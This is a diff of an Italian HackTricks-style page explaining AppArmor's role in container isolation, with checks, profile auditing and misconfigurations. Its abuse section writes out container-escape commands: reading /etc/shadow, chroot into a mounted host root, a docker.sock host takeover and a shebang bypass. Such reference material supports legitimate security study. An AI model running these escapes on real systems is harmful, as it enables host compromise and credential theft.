@@ -2,45 +2,58 @@
 
 {{#include ../../../../banners/hacktricks-training.md}}
 
+## Panoramica
+
+AppArmor è un sistema di **Mandatory Access Control** che applica restrizioni tramite profili specifici per programma. A differenza dei controlli DAC tradizionali, che dipendono in larga misura dalla proprietà di utenti e gruppi, AppArmor consente al kernel di applicare una policy associata al processo stesso. Negli ambienti container, questo è importante perché un workload potrebbe avere privilegi tradizionali sufficienti per tentare un'azione e vedersela comunque negare perché il suo profilo AppArmor non consente il percorso, il mount, il comportamento di rete o l'uso delle capability in questione.
+
+Il concetto più importante da tenere a mente è che AppArmor è **basato sui percorsi**. Gestisce l'accesso al filesystem tramite regole sui percorsi, anziché tramite etichette come fa SELinux. Questo lo rende accessibile e potente, ma significa anche che bind mount e layout alternativi dei percorsi richiedono particolare attenzione. Se lo stesso contenuto dell'host diventa accessibile tramite un percorso diverso, l'effetto della policy potrebbe non essere quello inizialmente previsto dall'operatore.
+
 ## Ruolo nell'isolamento dei container
 
-Le revisioni della sicurezza dei container spesso si fermano alle capabilities e a seccomp, ma AppArmor continua a essere importante dopo questi controlli. Immagina un container con più privilegi del necessario oppure un workload che, per motivi operativi, richiede una capability aggiuntiva. AppArmor può comunque limitare l'accesso ai file, il comportamento dei mount, il networking e i pattern di esecuzione in modi che bloccano il percorso di abuso più ovvio. Per questo disabilitare AppArmor "solo per far funzionare l'applicazione" può trasformare silenziosamente una configurazione semplicemente rischiosa in una attivamente sfruttabile.
+Le verifiche di sicurezza dei container spesso si limitano a capabilities e seccomp, ma AppArmor continua a essere importante anche dopo quei controlli. Immagina un container con più privilegi del dovuto o un workload che, per ragioni operative, necessitava di una capability aggiuntiva. AppArmor può comunque limitare l'accesso ai file, il comportamento dei mount, il networking e le modalità di esecuzione, bloccando i percorsi di abuso più ovvi. Per questo disabilitare AppArmor «solo per far funzionare l'applicazione» può trasformare silenziosamente una configurazione semplicemente rischiosa in una attivamente sfruttabile.
 
 ## Laboratorio
 
 Per verificare se AppArmor è attivo sull'host, usa:
+
 ```bash
 aa-status 2>/dev/null || apparmor_status 2>/dev/null
 cat /sys/module/apparmor/parameters/enabled 2>/dev/null
 ```
-Per vedere con quale utente è in esecuzione il processo corrente del container:
+
+Per vedere con quale utente è in esecuzione il processo attuale del container:
+
 ```bash
 docker run --rm ubuntu:24.04 cat /proc/self/attr/current
 docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
 ```
-La differenza è istruttiva. Nel caso normale, il processo dovrebbe mostrare un contesto AppArmor associato al profile scelto dal runtime. Nel caso unconfined, quel livello di restrizione aggiuntivo scompare.
 
-Puoi anche controllare cosa Docker ritiene di aver applicato:
+La differenza è istruttiva. Nel caso normale, il processo dovrebbe mostrare un contesto AppArmor associato al profilo scelto dal runtime. Nel caso non confinato, questo ulteriore livello di restrizione scompare.
+
+Puoi anche verificare cosa Docker ritiene di aver applicato:
+
 ```bash
 docker inspect <container> | jq '.[0].AppArmorProfile'
 ```
-## Utilizzo a Runtime
 
-Docker può applicare un profilo AppArmor predefinito o personalizzato quando l'host lo supporta. Podman può inoltre integrarsi con AppArmor sui sistemi basati su AppArmor, sebbene nelle distribuzioni incentrate su SELinux l'altro sistema MAC assuma spesso un ruolo principale. Kubernetes può esporre la policy AppArmor a livello di workload sui nodi che supportano effettivamente AppArmor. Anche LXC e i relativi ambienti system-container della famiglia Ubuntu fanno ampio uso di AppArmor.
+## Utilizzo a runtime
 
-Il punto pratico è che AppArmor non è una "funzionalità di Docker". È una funzionalità del kernel dell'host che diversi runtime possono scegliere di applicare. Se l'host non lo supporta o il runtime è configurato per eseguire il workload in modalità unconfined, la protezione prevista non è realmente presente.
+Docker può applicare un profilo AppArmor predefinito o personalizzato quando l'host lo supporta. Podman può integrarsi con AppArmor anche sui sistemi basati su AppArmor, sebbene nelle distribuzioni in cui SELinux è prioritario spesso sia l'altro sistema MAC a ricoprire il ruolo principale. Kubernetes può esporre policy AppArmor a livello di workload sui nodi che supportano effettivamente AppArmor. Anche LXC e i relativi ambienti Ubuntu per container di sistema fanno ampio uso di AppArmor.
 
-Nello specifico di Kubernetes, l'API moderna è `securityContext.appArmorProfile`. A partire da Kubernetes `v1.30`, le precedenti annotazioni beta di AppArmor sono deprecate. Sugli host supportati, `RuntimeDefault` è il profilo predefinito, mentre `Localhost` fa riferimento a un profilo che deve essere già caricato sul nodo. Questo è importante durante la review perché un manifest può sembrare compatibile con AppArmor pur dipendendo interamente dal supporto del nodo e dai profili precaricati.<sup>[[1]](#references)</sup>
+Il punto pratico è che AppArmor non è una "funzionalità di Docker". È una funzionalità del kernel dell'host che diversi runtime possono scegliere di applicare. Se l'host non lo supporta o al runtime viene chiesto di eseguire il container in modalità non confinata, la protezione presunta in realtà non c'è.
 
-Un dettaglio operativo sottile ma utile è che impostare esplicitamente `appArmorProfile.type: RuntimeDefault` è più restrittivo rispetto alla semplice omissione del campo. Se il campo è impostato esplicitamente e il nodo non supporta AppArmor, l'admission dovrebbe fallire. Se il campo viene omesso, il workload potrebbe comunque essere eseguito su un nodo senza AppArmor e semplicemente non ricevere questo ulteriore livello di confinement. Dal punto di vista di un attacker, questo è un buon motivo per verificare sia il manifest sia lo stato effettivo del nodo.<sup>[[1]](#references)</sup>
+Per Kubernetes, in particolare, l'API moderna è `securityContext.appArmorProfile`. Da Kubernetes `v1.30`, le vecchie annotazioni beta di AppArmor sono deprecate. Sugli host supportati, `RuntimeDefault` è il profilo predefinito, mentre `Localhost` fa riferimento a un profilo che deve essere già caricato sul nodo. Questo è importante durante la revisione, perché un manifest può sembrare compatibile con AppArmor pur dipendendo interamente dal supporto del nodo e dai profili precaricati.<sup>[[1]](#references)</sup>
 
-Sugli host Docker compatibili con AppArmor, il profilo predefinito più noto è `docker-default`. Questo profilo viene generato dal template AppArmor di Moby ed è importante perché spiega perché alcuni PoC basati sulle capabilities continuano a fallire in un container predefinito. In termini generali, `docker-default` consente il networking ordinario, nega le scritture su gran parte di `/proc`, nega l'accesso a parti sensibili di `/sys`, blocca le operazioni di mount e limita ptrace, impedendone l'uso come primitive generica per sondare l'host. Comprendere questa baseline aiuta a distinguere tra "il container dispone di `CAP_SYS_ADMIN`" e "il container può effettivamente usare questa capability contro le interfacce del kernel che mi interessano".
+Un dettaglio operativo sottile ma utile è che impostare esplicitamente `appArmorProfile.type: RuntimeDefault` è più rigoroso che omettere semplicemente il campo. Se il campo è impostato esplicitamente e il nodo non supporta AppArmor, l'ammissione dovrebbe fallire. Se il campo viene omesso, il workload può comunque essere eseguito su un nodo senza AppArmor, semplicemente senza ricevere questo ulteriore livello di confinamento. Dal punto di vista di un attaccante, questo è un buon motivo per controllare sia il manifest sia lo stato effettivo del nodo.<sup>[[1]](#references)</sup>
 
-## Gestione dei Profili
+Sugli host compatibili con Docker e AppArmor, il profilo predefinito più noto è `docker-default`. Questo profilo viene generato dal template AppArmor di Moby ed è importante perché spiega perché alcuni PoC basati sulle capability continuano a non funzionare in un container predefinito. In linea generale, `docker-default` consente il normale networking, nega le scritture in gran parte di `/proc`, nega l'accesso a parti sensibili di `/sys`, blocca le operazioni di mount e limita ptrace, impedendone l'uso come strumento generico per sondare l'host. Comprendere questa configurazione di base aiuta a distinguere tra "il container ha `CAP_SYS_ADMIN`" e "il container può effettivamente usare questa capability contro le interfacce del kernel che mi interessano".
 
-I profili AppArmor sono generalmente archiviati in `/etc/apparmor.d/`. Una convenzione comune per i nomi consiste nel sostituire gli slash presenti nel path dell'eseguibile con dei punti. Ad esempio, un profilo per `/usr/bin/man` viene comunemente archiviato come `/etc/apparmor.d/usr.bin.man`. Questo dettaglio è importante sia nella difesa sia nell'assessment, perché una volta individuato il nome del profilo attivo è spesso possibile trovare rapidamente il file corrispondente sull'host.
+## Gestione dei profili
 
-Tra i comandi utili per la gestione lato host troviamo:
+I profili AppArmor sono solitamente archiviati in `/etc/apparmor.d/`. Una convenzione comune consiste nel sostituire le barre nei percorsi degli eseguibili con dei punti. Per esempio, un profilo per `/usr/bin/man` viene comunemente archiviato come `/etc/apparmor.d/usr.bin.man`. Questo dettaglio è importante sia durante la difesa sia durante la valutazione, perché una volta noto il nome del profilo attivo, spesso è possibile individuare rapidamente il file corrispondente sull'host.
+
+Tra i comandi utili per la gestione lato host ci sono:
+
 ```bash
 aa-status
 aa-enforce
@@ -50,74 +63,90 @@ aa-genprof
 aa-logprof
 aa-mergeprof
 ```
-Il motivo per cui questi comandi sono importanti in un riferimento sulla container-security è che spiegano come i profili vengono effettivamente creati, caricati, impostati in complain mode e modificati dopo i cambiamenti all'applicazione. Se un operatore ha l'abitudine di spostare i profili in complain mode durante il troubleshooting e dimentica di ripristinare l'enforcement, il container può sembrare protetto nella documentazione, pur comportandosi nella realtà in modo molto più permissivo.
+
+Il motivo per cui questi comandi sono importanti in una guida sulla sicurezza dei container è che spiegano come i profili vengono effettivamente creati, caricati, impostati in modalità complain e modificati dopo gli aggiornamenti delle applicazioni. Se un operatore è solito impostare i profili in modalità complain durante la risoluzione dei problemi e poi dimentica di ripristinare l’applicazione delle regole, il container può sembrare protetto nella documentazione, pur comportandosi nella realtà in modo molto meno restrittivo.
 
 ### Creazione e aggiornamento dei profili
 
-`aa-genprof` può osservare il comportamento dell'applicazione e contribuire a generare un profilo in modo interattivo:
+`aa-genprof` può osservare il comportamento delle applicazioni e aiutare a generare un profilo in modo interattivo:
+
 ```bash
 sudo aa-genprof /path/to/binary
 /path/to/binary
 ```
-`aa-easyprof` può generare un profilo template che in seguito può essere caricato con `apparmor_parser`:
+
+`aa-easyprof` può generare un profilo modello che può essere caricato in seguito con `apparmor_parser`:
+
 ```bash
 sudo aa-easyprof /path/to/binary
 sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
 ```
-Quando il binario cambia e la policy deve essere aggiornata, `aa-logprof` può riprodurre i dinieghi trovati nei log e assistere l'operatore nel decidere se consentirli o negarli:
+
+Quando il binario cambia e la policy deve essere aggiornata, `aa-logprof` può riprodurre gli eventi di negazione rilevati nei log e aiutare l'operatore a decidere se consentirli o negarli:
+
 ```bash
 sudo aa-logprof
 ```
+
 ### Log
 
-I dinieghi di AppArmor sono spesso visibili tramite `auditd`, syslog o strumenti come `aa-notify`:
+I rifiuti di AppArmor sono spesso visibili tramite `auditd`, syslog o strumenti come `aa-notify`:
+
 ```bash
 sudo aa-notify -s 1 -v
 ```
-Questo è utile dal punto di vista operativo e offensivo. I defender lo usano per perfezionare i profili. Gli attaccanti lo usano per scoprire quale percorso o operazione esatta viene negata e se AppArmor è il controllo che blocca una exploit chain.
 
-### Identificare Il File Del Profilo Esatto
+Questo è utile dal punto di vista operativo e offensivo. I defender lo usano per perfezionare i profili. Gli attacker lo usano per capire quale percorso o operazione specifici vengono negati e se AppArmor è il controllo che blocca una exploit chain.
 
-Quando un runtime mostra un nome specifico del profilo AppArmor per un container, spesso è utile ricondurre quel nome al file del profilo presente sul disco:
+### Identificare il file del profilo esatto
+
+Quando un runtime mostra il nome di un profilo AppArmor specifico per un container, spesso è utile ricondurre quel nome al file del profilo su disco:
+
 ```bash
 docker inspect <container> | grep AppArmorProfile
 find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
 ```
-Questo è particolarmente utile durante la revisione lato host perché colma il divario tra "il container dichiara di essere in esecuzione sotto il profilo `lowpriv`" e "le regole effettive si trovano in questo specifico file, che può essere sottoposto ad audit o ricaricato".
 
-### Regole ad alto valore informativo da sottoporre ad audit
+Questo è particolarmente utile durante la verifica lato host, perché colma il divario tra «il container dichiara di essere in esecuzione con il profilo `lowpriv`» e «le regole effettive si trovano in questo specifico file, che può essere sottoposto ad audit o ricaricato».
 
-Quando puoi leggere un profilo, non fermarti alle semplici righe `deny`. Diversi tipi di regole modificano sostanzialmente l'efficacia di AppArmor contro un tentativo di escape dal container:<sup>[[2]](#references)</sup>
+### Regole ad alto impatto da verificare
 
-- `ux` / `Ux`: esegue il binary target senza restrizioni. Se un helper, una shell o un interpreter raggiungibile è consentito tramite `ux`, questa è solitamente la prima cosa da testare.
-- `px` / `Px` e `cx` / `Cx`: eseguono transizioni di profilo durante l'`exec`. Non sono automaticamente problematici, ma vale la pena sottoporli ad audit perché una transizione potrebbe portare a un profilo molto più permissivo di quello corrente.
-- `change_profile`: consente a un task di passare a un altro profilo caricato, immediatamente o al successivo `exec`. Se il profilo di destinazione è più debole, questo può diventare l'escape hatch previsto per uscire da un domain restrittivo.
-- `flags=(complain)`, `flags=(unconfined)` o il più recente `flags=(prompt)`: dovrebbero modificare il livello di fiducia riposto nel profilo. `complain` registra i rifiuti invece di applicarli, `unconfined` rimuove il boundary e `prompt` dipende da un percorso decisionale in userspace anziché da un deny applicato esclusivamente dal kernel.
-- `userns` o `userns create,`: le policy AppArmor più recenti possono mediare la creazione di user namespace. Se un profilo del container lo consente esplicitamente, gli user namespace annidati restano utilizzabili anche quando la piattaforma usa AppArmor come parte della propria strategia di hardening.
+Quando puoi leggere un profilo, non fermarti alle semplici righe `deny`. Diversi tipi di regole modificano in modo sostanziale l'efficacia di AppArmor contro un tentativo di container escape:<sup>[[2]](#references)</sup>
 
-Un comando `grep` utile lato host:
+- `ux` / `Ux`: esegue il binario di destinazione senza confinamento. Se un helper, una shell o un interprete raggiungibile è consentito con `ux`, di solito è la prima cosa da testare.
+- `px` / `Px` e `cx` / `Cx`: eseguono transizioni di profilo al momento di exec. Non sono automaticamente un problema, ma vale la pena verificarle perché una transizione potrebbe portare a un profilo molto più permissivo di quello attuale.
+- `change_profile`: consente a un task di passare a un altro profilo caricato, immediatamente o al prossimo exec. Se il profilo di destinazione è più debole, questo può diventare la via di escape prevista da un dominio restrittivo.
+- `flags=(complain)`, `flags=(unconfined)` o il più recente `flags=(prompt)`: queste opzioni dovrebbero influire sul livello di fiducia da riporre nel profilo. `complain` registra le violazioni invece di applicare i divieti, `unconfined` rimuove il confine di sicurezza e `prompt` dipende da una decisione in userspace anziché da un divieto applicato esclusivamente dal kernel.
+- `userns` o `userns create,`: le policy AppArmor più recenti possono controllare la creazione di user namespace. Se un profilo del container lo consente esplicitamente, i namespace utente annidati restano utilizzabili anche quando la piattaforma impiega AppArmor come parte della propria strategia di hardening.
+
+Comando grep utile lato host:
+
 ```bash
 grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
 ```
-Questo tipo di audit è spesso più utile che esaminare centinaia di regole ordinarie sui file. Se un breakout dipende dall'esecuzione di un helper, dall'ingresso in un nuovo namespace o dall'escape verso un profilo meno restrittivo, la risposta è spesso nascosta in queste regole orientate alle transizioni, anziché nelle righe ovvie come `deny /etc/shadow r`.
 
-## Misconfigurations
+Questo tipo di audit è spesso più utile che esaminare centinaia di regole ordinarie sui file. Se un breakout dipende dall'esecuzione di un helper, dall'ingresso in un nuovo namespace o dall'evasione verso un profilo meno restrittivo, la risposta è spesso nascosta in queste regole orientate alle transizioni, piuttosto che nelle ovvie righe del tipo `deny /etc/shadow r`.
 
-L'errore più evidente è `apparmor=unconfined`. Gli amministratori lo impostano spesso durante il debugging di un'applicazione che ha fallito perché il profilo ha correttamente bloccato qualcosa di pericoloso o imprevisto. Se il flag rimane in produzione, l'intero layer MAC è stato di fatto rimosso.
+## Configurazioni errate
 
-Un altro problema più sottile consiste nel presumere che i bind mounts siano innocui perché i permessi dei file sembrano normali. Poiché AppArmor è basato sui path, l'esposizione di path dell'host sotto percorsi di mount alternativi può interagire negativamente con le regole sui path. Un terzo errore è dimenticare che il nome di un profilo in un file di configurazione significa ben poco se il kernel dell'host non sta effettivamente applicando AppArmor.
+L'errore più ovvio è `apparmor=unconfined`. Gli amministratori spesso lo impostano durante il debug di un'applicazione che non funzionava perché il profilo aveva correttamente bloccato qualcosa di pericoloso o imprevisto. Se il flag rimane in produzione, l'intero livello MAC è di fatto rimosso.
 
-## Abuse
+Un altro problema più sottile è presumere che i bind mount siano innocui perché i permessi dei file sembrano normali. Poiché AppArmor si basa sui percorsi, esporre percorsi dell'host sotto posizioni di mount alternative può interagire negativamente con le regole sui percorsi. Un terzo errore è dimenticare che il nome di un profilo in un file di configurazione conta ben poco se il kernel dell'host non applica effettivamente AppArmor.
 
-Quando AppArmor non è presente, operazioni precedentemente limitate possono improvvisamente funzionare: la lettura di path sensibili attraverso bind mounts, l'accesso a parti di procfs o sysfs che avrebbero dovuto essere più difficili da usare, l'esecuzione di azioni relative ai mount se anche capabilities/seccomp lo consentono, oppure l'uso di path che un profilo normalmente negherebbe. AppArmor è spesso il meccanismo che spiega perché un tentativo di breakout basato sulle capabilities "dovrebbe funzionare" sulla carta, ma continua a fallire nella pratica. Rimuovendo AppArmor, lo stesso tentativo potrebbe iniziare ad avere successo.
+## Abuso
 
-Se sospetti che AppArmor sia il principale elemento che blocca una catena di abuso basata su path-traversal, bind-mount o mount, il primo passo consiste solitamente nel confrontare ciò che diventa accessibile con e senza un profilo. Ad esempio, se un path dell'host è montato all'interno del container, inizia verificando se puoi attraversarlo e leggerlo:
+Quando AppArmor non è attivo, operazioni precedentemente limitate potrebbero improvvisamente funzionare: leggere percorsi sensibili tramite bind mount, accedere a parti di procfs o sysfs che avrebbero dovuto essere più difficili da usare, eseguire operazioni relative ai mount se anche le capability/seccomp lo consentono oppure usare percorsi che un profilo normalmente negherebbe. Spesso AppArmor spiega perché un tentativo di breakout basato sulle capability, che sulla carta "dovrebbe funzionare", nella pratica fallisce comunque. Rimuovi AppArmor e lo stesso tentativo potrebbe iniziare a riuscire.
+
+Se sospetti che AppArmor sia il principale ostacolo a una catena di abuso basata su path-traversal, bind mount o mount, il primo passo di solito consiste nel confrontare ciò che diventa accessibile con e senza un profilo. Ad esempio, se un percorso dell'host è montato all'interno del container, inizia verificando se puoi raggiungerlo e leggerlo:
+
 ```bash
 cat /proc/self/attr/current
 find /host -maxdepth 2 -ls 2>/dev/null | head
 find /host/etc -maxdepth 1 -type f 2>/dev/null | head
 ```
-Se il container dispone inoltre di una capability pericolosa come `CAP_SYS_ADMIN`, uno dei test più pratici consiste nel verificare se AppArmor è il controllo che blocca le operazioni di mount o l’accesso a filesystem del kernel sensibili:
+
+Se il container dispone anche di una capability pericolosa come `CAP_SYS_ADMIN`, uno dei test più pratici consiste nel verificare se AppArmor è il controllo che blocca le operazioni di mount o l'accesso ai filesystem sensibili del kernel:
+
 ```bash
 capsh --print | grep cap_sys_admin
 mount | head
@@ -125,50 +154,62 @@ mkdir -p /tmp/testmnt
 mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
 mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
 ```
-Negli ambienti in cui un host path è già disponibile tramite un bind mount, la perdita di AppArmor può anche trasformare un problema di information disclosure in sola lettura in un accesso diretto ai file dell'host:
+
+Negli ambienti in cui un percorso dell'host è già disponibile tramite un bind mount, la perdita di AppArmor può anche trasformare un problema di divulgazione di informazioni in sola lettura in un accesso diretto ai file dell'host:
+
 ```bash
 ls -la /host/root 2>/dev/null
 cat /host/etc/shadow 2>/dev/null | head
 find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
 ```
-Lo scopo di questi comandi non è che AppArmor da solo crei il breakout. È che, una volta rimosso AppArmor, molte vie di abuso basate su filesystem e mount diventano immediatamente testabili.
+
+Lo scopo di questi comandi non è dimostrare che AppArmor, da solo, provochi la fuga dal container. Il punto è che, una volta rimosso AppArmor, diventa subito possibile testare molti percorsi di abuso basati su filesystem e mount.
 
 ### Esempio completo: AppArmor disabilitato + root dell'host montata
 
-Se il container ha già la root dell'host montata tramite bind mount in `/host`, la rimozione di AppArmor può trasformare una via di abuso del filesystem bloccata in un completo host escape:
+Se il root dell'host è già montato nel container tramite bind mount in `/host`, rimuovere AppArmor può trasformare un percorso di abuso del filesystem bloccato in una completa fuga dall'host:
+
 ```bash
 cat /proc/self/attr/current
 ls -la /host
 chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
 ```
-Una volta che la shell viene eseguita tramite il filesystem dell'host, il workload è di fatto evaso dal perimetro del container:
+
+Una volta che la shell viene eseguita tramite il filesystem host, il workload è di fatto uscito dai confini del container:
+
 ```bash
 id
 hostname
 cat /etc/shadow | head
 ```
-### Esempio completo: AppArmor disabilitato + socket di runtime
 
-Se la barriera reale era AppArmor attorno allo stato del runtime, un socket montato può essere sufficiente per una fuga completa:
+### Esempio completo: AppArmor disabilitato + socket runtime
+
+Se la vera barriera era AppArmor attorno allo stato del runtime, un socket montato può bastare per un escape completo:
+
 ```bash
 find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
 docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
 ```
-Il percorso esatto dipende dal punto di mount, ma il risultato finale è lo stesso: AppArmor non impedisce più l'accesso alla runtime API, e la runtime API può avviare un container in grado di compromettere l'host.
 
-### Esempio completo: bypass di un bind-mount basato sul percorso
+Il percorso esatto dipende dal punto di mount, ma il risultato finale è lo stesso: AppArmor non impedisce più l’accesso alla runtime API, che può avviare un container in grado di compromettere l’host.
 
-Poiché AppArmor è basato sui percorsi, la protezione di `/proc/**` non protegge automaticamente lo stesso contenuto procfs dell'host quando è raggiungibile attraverso un percorso diverso:
+### Esempio completo: bypass tramite bind mount basato sul percorso
+
+Poiché AppArmor si basa sui percorsi, proteggere `/proc/**` non protegge automaticamente gli stessi contenuti di procfs dell’host quando sono raggiungibili tramite un percorso diverso:
+
 ```bash
 mount | grep '/host/proc'
 find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
 cat /host/proc/sys/kernel/core_pattern 2>/dev/null
 ```
-L'impatto dipende da cosa viene esattamente montato e dal fatto che il percorso alternativo eluda anche altri controlli, ma questo schema è uno dei motivi più chiari per cui AppArmor deve essere valutato insieme alla disposizione dei mount, anziché in isolamento.
+
+L'impatto dipende da cosa viene montato esattamente e dal fatto che il percorso alternativo aggiri anche altri controlli, ma questo schema è uno dei motivi più evidenti per cui AppArmor va valutato insieme alla configurazione dei mount, anziché isolatamente.
 
 ### Esempio completo: Shebang Bypass
 
-La policy di AppArmor a volte prende di mira un percorso dell'interprete senza tenere pienamente conto dell'esecuzione degli script tramite la gestione dello shebang. Un esempio storico prevedeva l'uso di uno script la cui prima riga indicava un interprete sottoposto a confinement:<sup>[[3]](#references)</sup>
+AppArmor può associare un profilo al percorso dello script eseguito, anziché all'interprete indicato dallo shebang. Al contrario, invocando direttamente l'interprete si può selezionare il profilo dell'interprete. Un [manutentore di AppArmor descrive questa distinzione](https://bugs.launchpad.net/apparmor/+bug/1911431). Un esempio storico riguardava uno script la cui prima riga puntava a un interprete confinato:
+
 ```bash
 cat <<'EOF' > /tmp/test.pl
 #!/usr/bin/perl
@@ -179,11 +220,13 @@ EOF
 chmod +x /tmp/test.pl
 /tmp/test.pl
 ```
-Questo tipo di esempio è importante come promemoria del fatto che l’intento del profile e la semantica effettiva dell’esecuzione possono divergere. Quando si esamina AppArmor negli ambienti container, le catene di interpreter e i percorsi alternativi di esecuzione meritano particolare attenzione.
 
-## Checks
+L'esempio è solo un caso possibile in cui la capability sui file dell'interprete può diventare effettiva e l'effettivo attachment exec dello script consente l'operazione. Controlla la policy caricata e l'etichetta del processo, il capability bounding set, `no_new_privs` e lo stato `nosuid` del mount; il solo nome di un file di profilo o la voce `cap_setuid+ep` non dimostrano che la transizione sia utilizzabile. Le catene di interpreti e i percorsi di esecuzione alternativi meritano verifiche separate.
 
-L’obiettivo di questi checks è rispondere rapidamente a tre domande: AppArmor è abilitato sull’host, il processo corrente è confinato e il runtime ha effettivamente applicato un profile a questo container?
+## Verifiche
+
+Lo scopo di queste verifiche è rispondere rapidamente a tre domande: AppArmor è abilitato sull'host? Il processo corrente è confinato? Il runtime ha effettivamente applicato un profilo a questo container?
+
 ```bash
 cat /proc/self/attr/current                         # Current AppArmor label for this process
 aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
@@ -192,31 +235,30 @@ find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side 
 cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
 grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
 ```
+
 Cosa è interessante qui:
 
-- Se `/proc/self/attr/current` mostra `unconfined`, il workload non beneficia del confinamento AppArmor.
-- Se `aa-status` mostra AppArmor disabilitato o non caricato, qualsiasi nome di profilo nella configurazione del runtime è per lo più cosmetico.
-- Se `docker inspect` mostra `unconfined` o un profilo custom imprevisto, spesso questo è il motivo per cui funziona un percorso di abuso basato sul filesystem o sui mount.
-- Se `/sys/kernel/security/apparmor/profiles` non contiene il profilo previsto, la configurazione del runtime o dell'orchestrator, da sola, non è sufficiente.
-- Se un profilo apparentemente hardenizzato contiene regole come `ux`, `change_profile` ampio, `userns` o `flags=(complain)`, il confine pratico potrebbe essere molto più debole di quanto suggerisca il nome del profilo.
+- Se `/proc/self/attr/current` mostra `unconfined`, il carico di lavoro non beneficia dell'isolamento di AppArmor.
+- Se `aa-status` mostra AppArmor disabilitato o non caricato, qualsiasi nome di profilo nella configurazione del runtime è perlopiù cosmetico.
+- Se `docker inspect` mostra `unconfined` o un profilo personalizzato inatteso, spesso è questo il motivo per cui funziona un percorso di abuso basato sul file system o sui mount.
+- Se `/sys/kernel/security/apparmor/profiles` non contiene il profilo previsto, la configurazione del runtime o dell'orchestratore non è sufficiente da sola.
+- Se un profilo che dovrebbe essere hardened contiene regole `ux`, `change_profile` permissive, `userns` o del tipo `flags=(complain)`, il confine di sicurezza pratico potrebbe essere molto più debole di quanto suggerisca il nome del profilo.
 
-Se un container dispone già di privilegi elevati per motivi operativi, lasciare AppArmor abilitato spesso fa la differenza tra un'eccezione controllata e un problema di sicurezza molto più ampio.
+Se un container ha già privilegi elevati per motivi operativi, mantenere AppArmor abilitato fa spesso la differenza tra un'eccezione controllata e un problema di sicurezza molto più ampio.
 
-## Impostazioni predefinite del runtime
+## Impostazioni predefinite dei runtime
 
-| Runtime / piattaforma | Stato predefinito | Comportamento predefinito | Indebolimento manuale comune |
+| Runtime / piattaforma | Stato predefinito | Comportamento predefinito | Indebolimenti manuali comuni |
 | --- | --- | --- | --- |
-| Docker Engine | Abilitato per impostazione predefinita sugli host compatibili con AppArmor | Utilizza il profilo AppArmor `docker-default` salvo override | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
-| Podman | Dipendente dall'host | AppArmor è supportato tramite `--security-opt`, ma il comportamento predefinito esatto dipende dall'host/runtime ed è meno universale rispetto al profilo `docker-default` documentato da Docker | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
-| Kubernetes | Predefinito condizionale | Se `appArmorProfile.type` non è specificato, il valore predefinito è `RuntimeDefault`, ma viene applicato solo quando AppArmor è abilitato sul nodo | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` con un profilo debole, nodi senza supporto AppArmor |
-| containerd / CRI-O sotto Kubernetes | Segue il supporto del nodo/runtime | I runtime comunemente supportati da Kubernetes supportano AppArmor, ma l'applicazione effettiva dipende ancora dal supporto del nodo e dalle impostazioni del workload | Come nella riga Kubernetes; la configurazione diretta del runtime può anche omettere completamente AppArmor |
+| Docker Engine | Abilitato per impostazione predefinita sugli host compatibili con AppArmor | Usa il profilo AppArmor `docker-default`, a meno che non venga sovrascritto | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
+| Podman | Dipende dall'host | AppArmor è supportato tramite `--security-opt`, ma l'impostazione predefinita esatta dipende dall'host e dal runtime ed è meno universale del profilo `docker-default` documentato da Docker | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
+| Kubernetes | Abilitazione condizionale | Se `appArmorProfile.type` non è specificato, l'impostazione predefinita è `RuntimeDefault`, ma viene applicata solo quando AppArmor è abilitato sul nodo | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` con un profilo debole, nodi senza supporto per AppArmor |
+| containerd / CRI-O con Kubernetes | Dipende dal supporto del nodo e del runtime | I runtime comunemente supportati da Kubernetes supportano AppArmor, ma l'applicazione effettiva dipende comunque dal supporto del nodo e dalle impostazioni del workload | Come nella riga di Kubernetes; anche la configurazione diretta del runtime può escludere completamente AppArmor |
 
-Per AppArmor, la variabile più importante spesso è l'**host**, non solo il runtime. Un'impostazione del profilo in un manifest non crea confinamento su un nodo in cui AppArmor non è abilitato.
+Per AppArmor, la variabile più importante spesso è **l'host**, non solo il runtime. Un'impostazione del profilo in un manifest non crea isolamento su un nodo in cui AppArmor non è abilitato.
 
-## Riferimenti
+## References
 
-- [1] [Security context di Kubernetes: campi del profilo AppArmor e comportamento relativo al supporto del nodo](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
-- [2] [Manpage `apparmor.d(5)` di Ubuntu 24.04: transizioni exec, `change_profile`, `userns` e flag del profilo](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
-- [3] [HTB: Nunchucks - AppArmor shebang bypass con uno script Perl](https://0xdf.gitlab.io/2021/11/02/htb-nunchucks.html)
-
+- [1] [Contesto di sicurezza Kubernetes: campi del profilo AppArmor e comportamento del supporto dei nodi](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
